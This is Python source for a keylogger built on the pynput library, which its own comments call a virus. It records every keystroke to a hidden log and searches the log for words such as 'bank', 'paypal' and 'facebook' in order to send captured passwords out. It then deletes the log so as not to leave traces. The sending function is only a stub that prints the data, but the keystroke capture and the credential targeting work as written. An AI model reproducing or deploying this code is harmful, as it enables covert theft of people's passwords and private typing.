import os.path
from os import path
from pynput.keyboard import Key, Listener

keys = []
count = 0
MAX_COUNT = 10 #every how many letters to save
BUFFER_SIZE= 10 # every how many saves to send.

def press(key):
    """
    fucntion that comes from the listener of key pressed, logs the key presses and calls another function to log
    them into a file.
    :param key: the key pressed given from pynput module.
    """
    global keys, count
    keys.append(key)
    count += 1
    print(count)
    if count == MAX_COUNT:
        writer(keys)
        count = 0
        keys = []
    print("Key pressed {}".format(key))


def release(key):
    """
    A function to act as an exit from the program, technically speaking it's here for now but as a virus we are not
    interested on the user disabling it.
    :param key: key pressed on the keyboard
    :return: if it were to return false it would be to stop the listener.
    """
    if key == "Key.escape":
        return False


def writer(log):
    """
    Saves the log in a txt file
    :param log: an array of pressed keys.
    :return:
    """
    mode = "w"
    if path.exists("INTElog.txt"):
        mode = "a"
    with open("INTElog.txt", mode) as file:
        for i, key in enumerate(log):
            if i > 0:
                if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                    continue
                if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
                    continue  # don't save multiple enters or spaces.
            key = parse(str(key))  # it's better if it's a string from now on.
            file.write(key)
        file.close()
    results()


def parse(key):
    """
    takes a string of a key pressed and makes it human readable.
    :param key: a string to parse into readable format.
    :return: the key as readable as possible.
    """
    ctrl = {"\x01": "ctrlA", "\x03": "ctrlC", "\x16": "ctrlV"}
    if key == "'":  # handling the ' sign.
        return key
    key = str(key).replace("'", "")  # delete ' ' from output
    if str(key) == "Key.enter" or str(key) == "Key.space":
        return "\n"
    if key in ctrl:
        return ctrl[key]
    return key

def results():
    importantWords = ["bank", "hmo", "facebook", "mail", "paypal"]
    toSend= False
    with open("INTElog.txt", "r") as file:
        accumulatedLog = file.read()
        file.close()
    if len(accumulatedLog) > MAX_COUNT*BUFFER_SIZE:
        # list of important terms which have passwords we would want to steal
        for word in importantWords:
            if word in accumulatedLog:
                toSend = True
        if toSend:
            send(accumulatedLog,"email")
        os.remove("INTElog.txt") # delete file since it's been sent and we don't want to keep traces.

def send(data,email):
    print(data)

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
